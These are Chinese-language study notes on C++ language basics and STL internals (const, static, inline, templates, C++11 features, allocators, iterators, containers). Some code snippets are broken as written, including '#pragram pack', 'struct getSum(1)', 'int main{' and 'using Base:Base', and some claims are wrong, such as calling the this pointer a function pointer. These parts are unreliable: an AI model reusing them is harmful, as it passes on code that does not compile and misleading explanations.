# C++基础

## C和C++区别

**C面向过程，C++面向对象**

- 面向过程语言：性能比面向对象高，因为类调用时需要实例化，比较消耗资源，但是没有面向对象易维护，易复用，易扩展。
- 面向对象语言：易维护，易复用，易扩展，由于具有面向对象的特性，可以设计出低耦合的系统使得系统更加灵活。但是性能低。

**后缀名不同**

**一些关键字有区别：**

- C中的struct中不能有函数，但是C++中可以有
- malloc：返回值为void*，C中可以直接赋值给任何类型指针，但是C++中必须强制类型转换。

**返回值**

- C中如果一个函数没有返回值默认返回int，C++中没有返回值需要指定void

**缺省参数**

- C不支持缺省参数

**函数重载**

- C不支持函数重载，C++支持函数重载，常用于处理实现功能类似但是类型不同的问题。

## C++和java联系和区别

- 都是面向对象的语言，都支持封装，继承和多态
- java不提供指针直接访问内存，程序更加安全
- java的类是单继承的，C++支持多重继承；但是java的接口可以多继承
- java有自动内存管理机制，不需要程序员手动释放无用内存。

## const

- 修饰变量，说明该量不可改变
- 修饰指针，分为指向常量的指针（pointer to const），自身是常量的指针（const pointer）
- 修饰引用，指向常量的引用，既避免了拷贝，又避免了值被修改
- 修饰成员函数，说明该成员函数内不能修改成员变量
- 底层const是代表对象本身不可以被改变；顶层const是代表指针本身是一个常量，而指针指向的对象可以改变。

### const的指针与引用

- 指针
  - 指向常量的指针（pointer to const）
  - 自身是常量的指针（const pointer）
- 引用
  - 指向常量的引用（reference to const）
  - 没有const reference，因为引用本身就是const pointer

> （为了方便记忆可以想成）被const修饰（在const后面）的值不可以被改变

### const使用

```c++
//修饰函数
void fun1(const int var);	//修饰变量，形参在函数内不可改变
void fun2(const char* var);	//修饰指向常量的指针，参数指针所指向内容为常量
void fun3(char* const var);	//修饰常指针，参数指针为常量（常指针）
void fun4(const int& var);	//修饰引用，参数引用在函数内为常量
void fun5(void) const;		//修饰成员函数
//修饰返回值
const int fun6();		//返回一个常数
const int* fun7();		//返回一个指向常量的指针
const int* p = fun7();
int* const fun8();		//返回一个常指针
int* const p = fun8();
```

### const和define区别

- 编译器处理不同：
  - 宏定义在预处理阶段展开，不能对宏定义进行调试，生命周期结束于编译时期
  - const是一个“编译运行时”概念，在程序运行中使用起作用
- 起作用的方式不同：
  - 宏定义只是简单的字符替换，没有类型检查，存在边界的错误；const对应数据类型，进行类型检查
- 存储方式：
  - 宏定义进行展开，它定义的宏常量在内存中有若干个备份，占用**代码段**空间；const定义的只读变量在程序运行过程中只有一份备份，占用**数据段**空间。
- 宏定义不能调试，因为在预编译阶段会被替换；const可以进行调试
- 宏定义可以使用#undef取消符号定义；const不能重定义
- define可以用来防止头文件重复引用；const不能
- define不可以用于类成员变量的定义，但是可以用于全局变量；const可以用于类成员变量的定义，只要一定义，不可修改
- define可以用表达式作为名称；const采用一个普通的常量名称。

## static

- 修饰普通变量，修改变量的存储区域（静态区）和生命周期（程序整个生命周期）。在main函数运行前就分配了空间，如果有初始化值就用初始化值初始化它，如果没有，就是用默认初始化值
- 修饰普通函数，表明函数的作用范围（仅在该函数所在的文件内）。在多人开发项目中，为了防止与他人命名空间内的函数重名，可以将函数定义为static
- 修饰成员变量，修饰成员变量使所有的对象只保存一个该变量，并且不需要生成对象就可以访问该变量，使用`::`运算符
- 修饰成员函数，修饰成员函数使不需要生成对象就可以访问该函数，并且在static修饰的成员函数内不可以访问非静态成员变量

## this指针

- 是一个隐含于每一个非静态成员函数中的函数指针，指向**调用该成员函数的那个对象**
- 当对一个对象调用成员函数时，编译程序先将对象的地址赋给this指针，然后调用该成员函数，每次成员函数存取成员变量时，都**隐式**调用this指针
- 当一个成员函数被调用时，自动向他传递一个隐含的参数（this指针）
- this指针隐含的声明为：`classname* const this`，但是不能给this指针赋值，在类的const成员函数中，其类型为`const classname* const this`，这说明不能对这种对象的成员变量进行赋值操作
- this指针不是一个常规变量，而是一个右值，所以不能取得this的地址（不能`&this`）
- 在以下的场景中通常需要显示引用this指针：
  - 为实现对象的链式引用
  - 为避免对同一个对象进行赋值操作
  - 在实现一些数据结构的时候，比如list

## 宏define

- 宏定义可以实现类似于函数的功能，但是不是真的函数，宏定义括弧中的”参数“也不是真的参数，在宏展开的时候对"宏参数"进行一对一替换

## inline内联函数

### 特征

- 相当于把内联函数里面的内容复制到调用内联函数处
- 相当于不用执行进入函数的步骤，直接进入函数体
- 相当于宏，但是比宏多了类型检查，真正具有函数特性
- 编译器一般不内联包含循环、递归、switch等复杂操作的内联函数
- 在**类声明中定义的成员函数**，除了虚函数的其他成员函数都会**自动隐式**的当成内联函数，在外部定义的成员函数需要显式内联
- 程序中的`inline`关键字只是给编译器内联建议，能否内联由编译器决定

### inline处理步骤

1. 将`inline`函数体复制到`inline`函数调用处
2. 为所有`inline`函数的局部变量分配内存空间
3. 将`inline`函数的输入参数和返回值映射到调用方法的局部变量空间中
4. 如果有多个返回点，将其转变为`inline`函数代码块末尾的分支（`GOTO`）

### 优点

- 内联函数同宏函数一样将在被调用处进行代码展开，省去了参数压栈、栈帧开辟和回收、结果返回等，从而提高了程序运行速度
- 相对于宏函数而言，在代码展开时会进行安全检查胡总和自动类型转换（同普通函数），而宏定义不会
- 在类中声明同时定义的成员函数，自动转换为内联函数，因此内联函数可以访问类的成员变量，而宏定义不能
- 内联函数可以调试，宏定义不能

### 缺点

- 代码膨胀，以代码膨胀为代价，消除函数调用的开销
- 无法随着函数库升级而升级
- 是否内联，由编译器决定，`inline`关键字只是建议

> 虚函数可以是内联函数吗？
>
> - 可以，但是当虚函数表现出多态的时候不能内联
> - 内联是在编译期决定的，而虚函数的多态性表现在运行期，编译器无法知道运行期调用哪个代码，所以虚函数表现出多态时（运行期）无法内联
> - `inline virtual`唯一可以内联的时候是：编译器知道所调用的对象是哪个类，这只有编译器具有实际对象而不是对象的指针或者引用时才会发生

## volatile

```c++
volatile int i = 10;
```

- `volatile`关键字是一种类型修饰符，用它声明的类型变量可以被某些编译器未知的因素改变（操作系统，硬件等）。所以使用该关键字告诉编译器不应对这样的对象进行优化
- `volatile`关键字声明的变量，每次访问都必须从内存中取值（没有被`volatile`修饰的变量，可能由于被编译器优化，从CPU寄存器中取值）
- `const`（**编译期保证代码中没有被修改的地方，运行的时候不受限制**）可以是`volatile`（编译期告诉编译器不优化该变量，在运行期每次都从内存中取值）：表示一个变量在程序编译期不能被修改并且不能被优化，在**程序运行期变量值可能会被修改**，每次使用到该变量值都需要从内存中读取，防止意外错误
- 指针可以是`volatile`的

## assert()

- 断言，宏，非函数，在<cassert>头文件中，作用就是如果他的条件返回false，则终止程序执行，可以定义NDEBUG关闭`assert`，但是定义要在头文件前

## pragram pack(n) 字节对齐

- 设定`struct`，`union`以及类成员变量以n字节方式对齐，也就是让数据在内存中连续存储，同时以n字节对齐

### 使用

```c++
#pragram pack(push)	//保持对齐状态
#pragram pack(4)	//设定为4字节对齐
struct test{
	char m1;
	double m4;
	int m3;
};
#pragram pack(pop)	//恢复对齐状态
```

## 位域

```c++
Bit mode: 2;
```

- 类可以将其（非静态）成员变量定义为位域（bit-field），在一个位域中含有一定数量的二进制位
- 当一个程序需要向其他程序或者硬件设备传递二进制数据时，通常会用到位域
- 位域在内存中的分布和机器有关
- 位域的类型必须是整型或者枚举类型的，带符号类型中的位域的行为将因具体实现而定
- 取地址运算符`&`不能作用于位域，任何指针都无法指向类的位域

## extern

- 被`extern`限定的函数或变量是`extern`类型的
- 被`extern "C"`修饰的变量或者函数是按照C语言的方式编译的链接的，可以避免C++因为符号修饰导致代码不能和C语言库中的符号进行链接的问题

## struct和typedef struct

### C

```c++
typedef struct student{
	int age;
}s;
// 等价于
struct student{
	int age;
};
typedef struct student s;
```

- 上述的`s`等价于`struct student`，但是两个标识符名称空间不同
- 另外还可以定义于`struct student`不会冲突的`void student()`

### C++

- C++中的编译器定位符号的规则（搜索规则）于C中的不同，会导致：
  - 如果在类标识符空间定义了`struct student{...};`，使用`student me;`时，编译器将会搜索全局标识符表，`student`未找到时，则在类标识符中搜索；也即表现为可以使用`student`也可以使用`struct student`
  - 如果定义一个同名函数，则`student`只表示函数，结构体智能使用`struct student me`表示，也即`s me;`

## struct和class in C++

- 总的来说，struct 更适合看成是一个数据结构的实现体，class 更适合看成是一个对象的实现体。

### 区别

- 最本质的一个区别就是默认的访问控制
  - 默认的继承访问权限。struct 是 public 的，class 是 private 的。
  - struct 作为数据结构的实现体，它默认的数据访问控制是 public 的，而 class 作为对象的实现体，它默认的成员变量访问控制是 private 的。

## union

- 联合（union）是一种节省空间的特殊的类，一个 union 可以有多个数据成员，但是在**任意时刻只有一个数据成员可以有值**。当某个成员被赋值后其他成员变为未定义状态。联合有如下特点：
  - 默认访问控制符为 public
  - 可以含有构造函数、析构函数
  - 不能含有引用类型的成员
  - 不能继承自其他类，不能作为基类
  - 不能含有虚函数
  - 匿名 union 在定义所在作用域可直接访问 union 成员
  - 匿名 union 不能包含 protected 成员或 private 成员
  - 全局匿名联合必须是静态（static）的

## 使用C实现C++的类

- 使用C实现C++的对象特性（封装、继承、多态）
  - 封装：使用函数指针把属性和方法封装到结构体中
  - 继承：结构体嵌套
  - 多态：父类和子类方法的函数指针不同

## explicit关键字

- `explicit`修饰构造函数时，可以防止隐式转换或者复制初始化
- `explicit`修饰转换函数时，可以防止隐式转换，但按语境转换除外

### 使用

```c++
struct A{
	A(int){}
	operator bool() const {return true;}
};
struct B{
	explicit B(int){}
	explicit operator bool() const {return true;}
};
int main{
    B b1(1);	//OK,直接初始化
    B b2 = 1;	//Error,被explict修饰的构造函数不能复制初始化
}
```

## friend友元类和友元函数

- 能访问私有成员
- 破环封装性
- 友元关系不能传递
- 友元关系的单向性
- 友元声明的形式和数量不受限制

## using

- 一条`using`声明语句一次只引入命名空间的一个成员，这使得我们可以清楚知道程序所引用的到底是哪个命名空间里的函数，比如

```
using namespace_name::name;
```

- 构造函数的`using`声明：在C++11中，可以直接重用其直接基类定义的构造函数，比如

```
class Derived:Base{
public:
	using Base:Base;
};
```

- 如上，对于基类的每个构造函数，编译器都生成一个与之对应（形参列表完全相同）的派生类构造函数，生成如下类型构造函数：

```
Derived(params):Base(args){}
```

- `using`指示使得某个特定命名空间中所有名字都可见，这样就无需再为他们都加上任何前缀了，比如

```
using namespace std;
```

> 应当尽量少使用`using`指示污染命名空间，尽量多使用`using`声明

## ::范围解析运算符

- 分类
  - 全局作用域符（`::name`）：用于类型名称（类，类成员，成员函数，变量等）前，表示作用域为全局命名空间
  - 类作用域符（`class::name`）：用于表示指定类型的作用域范围是具体某个类的
  - 命名空间作用域符（`namespace::name`）：用于表示指定类型的作用域范围是具体某个命名空间的

## enum枚举类型

- 限定作用域的枚举类型

```c++
enum class open_modes{input, output, append};
```

- 不限定作用域的枚举类型

```c++
enum color {red, yellow, green};
enum {floatPrec=6, doublePrec=10};
```

## decltype

- 用于检查实体的声明类型，表达式的类型以及值分类，使用

```c++
decltype ( expression )
```

- 使用说明

```c++
//尾置返回允许再参数列表之后声明返回类型
template<typename T> auto fun1(T beg, T end) -> decltype(*beg){
	//...
	return *beg;
}
//为了使用模板参数成员，必须用typename
template<typename T> auto fun2(T beg, T end) -> typename remove_reference<decltype(*beg)>::type{
	//...
	return *beg;
}
```

## 引用

### 左值引用

- 常规引用，一般表示对象的身份

### 右值引用

- 右值引用就是必须绑定到右值（一个临时对象，将要销毁的对象）的引用，一般表示对象的值
- 右值引用可以实现转移语义（Move Sementics）和精确传递（Perfect Forwarding），他的主要目的有两个：
  - 消除两个对象交互时不必要的对象拷贝，节省运算存储资源，提高效率
  - 能够更简洁明确地定义泛型函数

### 引用折叠

- `X& &`、`X& &&`、`X&& &` 可折叠成 `X&`
- `X&& &&` 可折叠成 `X&&`

## 指针和引用的区别

本质区别：指针是地址，引用是别名

- 指针在运行时可以改变所指向的值，而引用一旦与某个对象绑定之后无法再改变
- 指针可以不用初始化，引用必须初始化
- 程序为指针变量分配区域，不为引用分配内存区域
- 引用可以被认为是不可变的指针

## 构造函数和初始化

- **默认构造函数（无参数）：**如果创建一个类没有写任何构造函数，系统自动生成默认的构造函数，或者写一个不带任何参数的构造函数。
- **一般构造函数：**可以有各种参数形式，一个类可以有多个构造函数，前提是参数的个数或者类型不同
- **拷贝构造函数：**参数为类对象本身的引用，用于根据一个已经存在的对象复制出一个新的该类的对象，一般在函数中会将已存在对象的数据成员的值复制一份到新创建的对象中。参数是（const &）类型的。
  - 用类的一个对象取初始化另一个对象时
  - 当函数的形参是类的对象时（值传递），如果是引用则不会使用拷贝构造函数
  - 当函数的返回值是类的对象时，如果是引用则不会使用拷贝构造函数

=dufault：将拷贝控制成员定义为=default显式要求编译器生成合成的版本

=delete：将拷贝构造函数和拷贝赋值运算符定义为删除的函数，阻止拷贝

=0：将虚函数定义为纯虚函数

### 构造函数/拷贝构造函数/赋值运算符

- 构造函数：对象不存在，自己进行初始化工作
- 拷贝构造函数：对象不存在，使用其他对象进行初始化
- 赋值运算符：对象存在，用其他的对象给他赋值

### 直接初始化和复制初始化

直接初始化直接调用于实参匹配的构造函数

复制初始化总是调用复制构造函数，复制初始化首先使用指定构造函数创建一个临时对象，然后用复制构造函数将那个临时对象复制到正在创建的对象。

### 初始化和赋值

而初始化是要创建一个新的对象，并且其初值来自于另一个已存在的对象。

赋值操作是在两个已经存在的对象间进行的。

### 初始化列表

- C++构造函数的初始化列表可以使得代码更加简洁，并且少了一次调用默认构造函数的过程，可以用于全部成员变量，也可以只用于部分成员变量
- **成员变量的初始化顺序和初始化列表中列出的变量的顺序无关，只和成员变量再类中声明的顺序有关**
- 还有一个重要的功能 就是初始化`const`成员变量。**初始化`const`成员变量的唯一方法就是使用初始化列表**
- 引用类型，引用必须再定义的时候初始化，并且不能重新赋值，所以也要写在初始化列表里面

#### initializer_list列表初始化

- 使用花括号初始化器列表初始化一个对象，其中对应构造函数接受一个`std::initializer_list`参数

## 模板

模板是泛型编程的基础，泛型编程即以一种独立于任何特定类型的方式进行编码。

模板是C++支持参数化多态的工具，使用模板可以使用户为类或者函数声明一种一般模式，使得类中的某些数据成员或者成员函数的参数、返回值取得任意类型。

- 模板是一种对类型进行参数化的工具
- 通常有两种：函数模板和类模板
  - 函数模板针对仅参数类型不同的函数
  - 类模板针对仅数据成员和成员函数类型不同的类

### 模板的特例化

单一的模板为了适应大众化，使每种类型都具有相同的功能，但对于某种特定类型，如果要实现其特有的功能，单一模板无法做到，这时就需要模板的特例化。

它是对单一模板提供的一个特殊实例，他将一个或者多个模板参数绑定到特定的类型或者值上。

#### 函数模板特例化

必须为原函数模板的每个模板参数都提供实参，且使用关键字template后跟一个空尖括号<>，表明将原模版的所有模板参数提供实参。

特例化的实质是实例化一个模板，而不是重载它，特例化不影响参数匹配，参数匹配都以最佳匹配为主。

#### 类模板特例化

原理类似函数模板，不过在类中，可以对模板进行特例化，也可以对类进行部分特例化。

类模板的部分特例化：不必为所有模板参数提供实参，可以指定一部分而非所有所有模板参数，一个类模板的部分特例化本身还是一个模板，使用它时必须为其特例化版本中未指定的模板参数提供实参。

### 模板的应用场景

- 数据类型与算法相分离的**泛型编程**

- 类型适配Traits

- 函数转发

- 元编程

  - ```c++
    template<int N> 
    struct getSum{
    	enum{
    		value = getSum<N-1>::value+N,
    	};
    };
    template<>
    struct getSum(1){
    	enum{
    		value = 1,
    	};
    };
    cout << getSum<100>::value;		// 输出5050
    ```

## C++异常处理

C++中异常事件发生时，程序使用throw关键字抛出异常表达式，抛出点称为异常出现点，有操作系统为程序设置当前异常对象，然后执行程序的当前异常处理代码块，在包含了异常出现点的最内层的try块，一次匹配catch语句中的异常对象（只进行类型匹配，catch的参数有时候在catch语句中并不会使用到）。

若异常匹配成功，则执行catch块内的异常处理语句，然后执行try...catch之后的代码。如果当前的try...catch找不到匹配该异常对象的catch语句，则有更外层的try...catch块来处理该异常；如果当前函数内所有的try...catch块都不能匹配该异常，则递归回退到调用栈的上一层处理该异常。

如果一直回退到主函数都无法处理，则调用系统函数terminate()终止程序。

```
// 一些异常类型
exception		最常用的异常类，只报告异常的发生而不报告任何额外的信息<exception>
runtime_error	只有在运行的时候才能检测该异常<stdexcept>
overflow_error	运行时错误：计算上溢
underflow_error	运行时错误：计算下溢
logic_error		逻辑错误
invalid_argument	逻辑错误：参数无效
out_of_range	逻辑错误：使用一个超出有效范围的值
bad_alloc		内存动态分配错误
```

```
try{
	语句
}
catch(异常类型){
	异常处理代码
}
catch(异常类型){
	异常处理代码
}
```

## C++11 新特性

- nullptr：替代null，专门用来区分空指针
- 类型推导：auto（变量） ，decltype（表达式）
- 区间迭代：for（auto i ：arr）
- 初始化列表：initializer list`vector<int> num{1,2,3}`
- 智能指针
- lambda表达式
  - `[捕获区](参数区){代码区};`比如`sort(arr.begin(),arr.end(),[](int a, int b){return a > b;});`
  - 捕获一般有以下几种用法：
    - `[a,&b]`：其中a以复制捕获，b以引用捕获
    - `[this]`：以引用捕获当前对象（*this）
    - `[&]`：以引用捕获所有用于lambda体内的自动变量，并以引用捕获当前对象，如果存在
    - `[=]`：以复制捕获
    - `[]`：不捕获，大多数情况下适用
- 右值引用和移动`move`语义：
  - C++中的变量要么是左值（通俗指非临时变量，&引用），要么是右值（通俗指临时对象，&&引用）。
  - 右值引用实现了转移语义和完美转发，主要目的有两个方面
    - 消除两个对象交互时不必要的对象拷贝，节省运算存储资源，提高效率
    - 能够更简洁的定义泛型函数
  - 移动语义：可以将资源（堆，系统对象等）从一个对象转移到另一个对象，这样可以减少不必要的临时对象的创建、拷贝及销毁
  - `std::move`：将左值变成一个右值，它是将对象的状态或者所有权从一个对象转移到另一个对象，只是转义，没有内存拷贝。
  - 完美转发：`std::forward()`函数可以对左值引用，右值引用，常左值引用，常右值引用进行完美转发。
- 新增容器：array，forward_list，无序容器（通过哈希实现）（unordered_map/multimap,unordered_set/multiset）

# C++ STL

Standard Template Library，标准模板库。

主要由六大组件组成：

- 容器（Containers）：各种数据结构如（顺序容器）vector，deque，forward_list，list；（关联容器）set，multiset，map，multimap；（无序关联容器）unordered_set，unordered_multiset，unordered_map，unordered_multimap
- 算法（Algorithm）：各种常用算法如sort，search，copy等
- 迭代器（Iterators）：泛型指针。
- 仿函数（functors）：行为类似函数，可以作为算法的某种策略
- 适配器（Adapters）：一种来修饰容器或仿函数或迭代器接口的东西如stack，queue，priority_queue
- 分配器（Allocators）：负责空间配置和管理

## 分配器（Allocators）

### 构造和析构的基本工具

`construct()`接收一个指针和初值value，该函数的用途是将初值设定到指针所指的空间上。C++的`placement new`运算符可用来完成。

`destory()`有两个版本，第一个版本接收一个指针，准备将该指针所指之物释放；第二版本接受first和last两个迭代器，将之间的对象析构掉。

### 空间配置和释放

对象构造前的空间配置和对象析构后的空间释放，由`<stl_alloc.h>`负责：

- 向内存堆要求空间
- 考虑多线程状态
- 考虑内存不足的应变措施
- 考虑内存碎片问题

C++内存配置由`::operator new()`和`::operator delete()`完成

为了考虑到内存碎片问题，SGI设计了双层级配置器，**第一层配置器（__malloc_alloc_template）直接使用`malloc()`和`free()`；第二级配置器（__default_alloc_template）视情况使用不同的策略：**

- 如果配置区块大于128bytes，视之为足够大，直接调用第一级配置器
- 如果小于，视之为过小，为了降低额外负担和内存碎片，使用内存池（memory pool）方式
  - 维护16个自由链表（free lists），负责16种小型区块的次配置能力，内存池以malloc()配置而得

#### STL内存池（Memory Pool）

`chunk_alloc()`函数以`end_free-start_free`来判断内存池的大小，如果大小充足，就直接调用20个区块返回给free list，如果不足就提供一个以上的区块，这时候引用传递的nobjs参数会被修改为实际能够调用的区块数。如果一个也无法提供，就利用malloc()函数从heap中配置内存，增加内存池大小。新大小为需求量的两倍，再加上随着配置次数增加而越来越大的附加量。

## 迭代器（Iterators）和traits编程技巧

一种方法，能够依序巡访某个容器所含的各个元素，而又无需暴露该容器的内部表述方式。

迭代器是一种行为类似指针的对象，而指针的各种行为中最常见也最重要的便是解引用（dereference）和成员访问（member access）。

- 可以使用模板函数的**参数推导功能**来进行迭代器的关联类型（associated type），但是参数推导功能只能推导参数，而无法推导函数的返回值类型；
- 可以声明内嵌类型，但是并不是所有的迭代器都是class type，比如原生指针就不行。所以如果不是class type，就无法为它定义内嵌类型。
- 所以还需要针对**原生指针T\*和const原生指针const T\***定义特化版

但是迭代器的关联类型并不只是”迭代器所指对象的类型“一种而已，最常用的关联类型有5种。

### traits（特性）

也被称为特性萃取技术，就是指提取”被传进的对象“对应的返回类型，**让同一个接口实现对应的功能**。

在STL种，算法和容器是分离的，两者通过迭代器连接，算法在实现时并不知道传进来的是什么，traits技法相当于在接口和实现之间加了一层封装，来隐藏一些细节并协助调用合适的方法，这需要一些技巧（比如偏特化）。

根据经验，最常用的迭代器关联类型有5种：

```c
// 内嵌类型
template<class T>
struct iterator_traits{
    // 由于C++语言默认情况下，假定通过作用域运算符访问的名字不是类型，所以想要访问的是类型的时候
    // 必须使用typename告诉编译器这是一个类型
	typedef typename T::iterator_category	iterator_category;
	typedef typename T::value_type			value_type;
	typedef typename T::difference_type		difference_type;
	typedef typename T::pointer				pointer;
	typedef typename T::reference			reference;
};
// T*特化版
template<class T>
struct iterator_traits<T*>{
    typedef random_access_iterator_tag	iterator_category;
    typedef T							value_type;
    typedef ptrdiff_t					difference_type;
    typedef T*							pointer;
    typedef T&							refernce;
};
// const T*特化版
template<class T>
struct iterator_traits<const T*>{
    typedef random_access_iterator_tag	iterator_category;
    typedef T							value_type;
    typedef ptrdiff_t					difference_type;
    tyepdef const T*					pointer;
    typedef const T&					reference;
};
```

通过`iterator_traits`的封装，则**对任意类型**（不论是迭代器，还是原生指针int\*或const int\*），都可以通过它获取正确的关联类型信息。

- `value_type`：指迭代器所指对象的类型
- `difference_type`：用来表示两个迭代器之间的距离
- `reference_type`：指引用类型`const T&`
- `pointer_type`：指针类型`T*`
- `iterator_category`：迭代器根据移动特性和操作，可以分为五类
  - `Input Iterator`：这种迭代器所指的对象，不允许改变，只读
  - `Output Iterator`：只写
  - `Forward Iterator`：允许”写入型“算法（例如replace()）在此种迭代器所形成的区间上进行读写操作
  - `Bidirectional Iterator`：可双向移动，某些算法需要逆向走访某个迭代器区间（例如逆向拷贝某范围内的元素）
    - `Random Access Iterator`：前四种迭代器都只提供一部分指针算术能力（前三支持`operator++`，第四还支持`operator--`），第五种则涵盖所有指针算术能力（p+n,p-n,p[n],p1-p2,p1<p2）  																																																																	

## 顺序容器（sequential containers）

- vector：
  - 底层数组
  - 随机读改，尾部增删O(1)，头部增删O(N)，支持随机访问
  - 无序可重复
- list：
  - 底层双向链表
  - 指定位置增删O(1)，不支持随机访问
  - 无序可重复
- forward_list：
  - 底层单向链表
  - 指定位置增删O(1)，不支持随机访问
  - 无序可重复
- deque：
  - 底层双端队列（一个中央控制器+多个缓冲区）
  - 头尾增删O(1)，支持随机访问
  - 无序可重复

### vector

相比于数组的静态空间，Vector是动态空间，随着元素的加入，内部机制会自动扩充空间以容纳新元素。

vector支持随机存取，提供的是`Random_access_iterators`，也就是vector的迭代器是普通指针。

#### vector的扩容

- 如果原大小为0，则配置1（各元素大小）；

- 如果原大小不为1，则配置原大小的两倍（前半段用来放原数据，后半段用来放新数据）；（开辟一块新的空间而不是在原来空间的后面添加）

- 将原来vector的内容拷贝到新的vector中；再新的vector插入新元素
- 析构原来的vector，并调整迭代器指向新的vector。（一旦引起空间重新配置，所有指向原来vector的迭代器就都失效了）

**插入时**首先检查备用空间大小是否大于新增元素个数m

- 如果大于，则先把插入点之后的所有元素向后移动m位，然后在插入点插入新增元素；
- 如果小于，则先按照上述扩容步骤（max(old_size,n)）进行扩容，然后将插入点之前的数据复制到新空间，再把新增元素填入新空间，最后把旧vector中插入点之后的元素复制到新空间。

#### 使用vector的注意事项

在一个vector的尾部之外的任何位置添加元素，都需要重新移动元素。同时可能会引起整个对象存储空间的重新分配。

频繁调用push_back()可能会引起对象的重新分配，并将旧的空间元素移动到新的空间，这十分耗费时间。

### list

任何位置的元素插入和删除的时间复杂度都是常数时间。

```c
// 底层实现为双向链表
template <class T>
struct __list_node{
	typedef void* void_pointer;
	void_pointer prev;
	void_pointer next;
	T data;
};
```

由于底层实现为双向链表，迭代器必须具有前后移动的能力，所以list提供的迭代器为`bidirectional_iterator`双向迭代器，并且插入和结合操作都不会导致原有的list迭代器的失效，删除操作时只会导致”指向被删除的那个元素“的迭代器失效。

在SGI STL中，list的实现不仅是双向链表，同时还是一个环状双向链表，所以只需要一个指针就可以完整的遍历整个链表。此时只需要在最后一个节点的后面加上一个空白节点，就可以实现STL要求的**”前闭后开“**区间的要求。

List的排序算法不能使用STL的算法sort()，必须使用自己的sort()成员函数，因为STL的sort()函数只接受`RandomAccessIterator`

### forward_list

单向链表，任何位置的插入和删除的时间复杂度都是O(1)，不支持随机访问。迭代器为`forward_iterator`。

元素插入使用push_front()，所以其元素次序于插入次序相反。

### deque队列

vector是一个单向开口的连续线性空间，deque是一个双向开口的连续线性空间（双端队列），即可以在头尾两端分别进行插入和删除操作。

相对vector的区别：

- deque允许以常数时间内对头部进行元素的插入和删除操作
- deque没有容量（capacity）概念，因为是以动态的分段连续空间组合而成，随时可以增加一段新的空间并链接起来

虽然deque也提供`Random Access Iterator`，但是他的迭代器并不是普通的指针，这影响了他的计算效率。

对deque进行排序操作时，为了最高效率，可以将它完整的复制到一个vector中，排序之后在复制回deque。

#### deque的中控器

deque由一段一段的定量连续空间组成，一旦有必要在deque的头部或者尾部添加新空间，便配置一定量的连续空间，串接在整个deque的头部或者尾部。同时使用主控维护其整体连续的假象。

deque采用一块所谓的`map`来作为主控，其中每个元素都是一个指针，指向另一端连续线性空间，称为缓冲区。缓冲区才是deque的存储空间主体。

#### deque的迭代器

```c
T*	cur;	// 指向所指缓冲区中的当前元素
T*	first;	// 指向所指缓冲区中的头
T*	last;	// 指向所指缓冲区的尾（含备用空间）
map_pointer node;	// 指向map中指向该缓冲区的节点

deque::begin()	//返回迭代器start，指向deque中第一个元素
deque::end()	//返回迭代器end，指向deque中最后一个元素
```

#### deque的插入与扩容

当进行push_back()操作时，当插入的元素正好使缓冲区满时，进行扩容操作，新开辟一个缓冲区，并将end指向新开辟的缓冲区

进行push_front()操作时，首先使用`start.cur != start.first`判断第一缓冲区是否还有备用空间，如果有就直接在备用空间上构造元素；如果没有就配置一个新的缓冲区，并将start指向新开辟的缓冲区。

在扩容过程中，如果map的尾部的节点备用空间不足，就配置一个更大的，拷贝原来的过去，然后释放；如果头部节点空间不足，也是如此。

## 容器适配器（container adapter）

### stack

是一种先进后出（FILO）的数据结构，只有一个出口，只能在其顶端操作O(1)，不允许遍历，stack没有迭代器。

其底层使用deque或者list实现。因为其以底层容器完成其所有工作，而具有这种”修改某物接口，形成另一种风貌“的性质的结构称为适配器。

### queue

是一种先进先出（FIFO）的数据结构，其有两个出口，允许在头尾两端进行操作（尾部插入，头部取出）O(1)，不允许遍历，没有迭代器。

底层使用deque或者list实现。

### priority_queue

是一种有序的queue，允许在头尾两端进行操作（尾部插入，头部取出）O(logN)，不允许遍历，没有迭代器。

底层使用vector（max-heap或min-heap）实现。

## 有序关联容器

STL的关联式容器主要有set（集合）和map（映射）两大类，以及他们的衍生体multiset和multimap，底层均以RB-tree（红黑树）实现。RB-tree也是一个独立容器，但是不开放给外界使用。

关联式容器即每个元素都有一个键（key）和一个值（value）。当元素被插入到关联式容器中时，容器内部结构（RB-tree）便依据键值大小，将其放置在合适的位置。关联式容器没有头部和尾部的概念。

### set

所有元素都会根据元素的键值自动被排序，set元素的键值就是value实值。

set不允许存在两个相同的元素。

底层使用RB-tree实现，存在`constant bidirectional iterators`，即不允许通过迭代器对集合内元素进行修改。

与list类似，当对元素进行增删操作时，除了被删除的那个迭代器之外，其他迭代器全部有效。

### map

所有元素都会按照元素的键值自动排序。map的所有元素都是pair，同时拥有键值（key）和实值（value）。

pair的第一个元素被视为键值，第二个元素为实值。map不允许存在两个相同的键值。

底层使用RB-tree实现，存在`constant bidirectional iterators`，即不允许通过迭代器对集合内元素进行修改。

与list类似，当对元素进行增删操作时，除了被删除的那个迭代器之外，其他迭代器全部有效。

### multiset

与set的唯一差别就是允许键值重复，底层的插入操作使用的是RB-tree的`insert_equal()`而不是`insert_unique()`

迭代器为`constant bidirectional iterators`

### multimap

与map的唯一差别就是允许键值重复，底层的插入操作使用的是RB-tree的`insert_equal()`而不是`insert_unique()`

迭代器为`constant bidirectional iterators`

## 无序关联容器

底层使用hash_table实现，其中哈希表里的元素节点被称为桶（bucket），桶内维护的是链表，但不是STL中的链表，而是自行维护的一个node。bucket聚合体也即hash_table使用vector实现。

```c
template <class Value>
struct __hashtable_node{
	__hashtable_node* next;
	Value val;
};
```

所有无序关联容器的迭代器为`forward iterators`

### unordered_set

是含有键值类型唯一对象集合的关联容器。搜索、插入和删除都拥有平均O(1)时间复杂度。

在内部，元素并不以任何特别顺序排序，而是组织进桶中。元素被放进哪个桶完全依赖其值的哈希。这允许对单独元素的快速访问，因为哈希一旦确定，就准确指代元素被放入的桶。

不可修改容器元素（即使通过非 const 迭代器），因为修改可能更改元素的哈希，并破坏容器。

### unordered_map

一种关联容器，含有带唯一键的键值对pair。搜索、插入和删除都拥有平均常数时间复杂度。

元素在内部不以任何特定顺序排序，而是组织进桶中。元素放进哪个桶完全依赖于其键的哈希。这允许对单独元素的快速访问，因为一旦计算哈希，则它准确指代元素所放进的桶。

### unordered_multiset

是关联容器，含有**可能非唯一** Key 类型对象的集合。搜索、插入和删除拥有平均常数时间复杂度。

元素在内部并不以任何顺序排序，只是被组织到桶中。元素被放入哪个桶完全依赖其值的哈希。这允许快速访问单独的元素，因为一旦计算哈希，它就指代放置该元素的准确的桶。

插入操作使用insert_equal()，set使用的是insert_unique()

### unordered_multimap

一种关联容器，含有可能非唯一键的键值对pair。搜索、插入和删除都拥有平均常数时间复杂度。

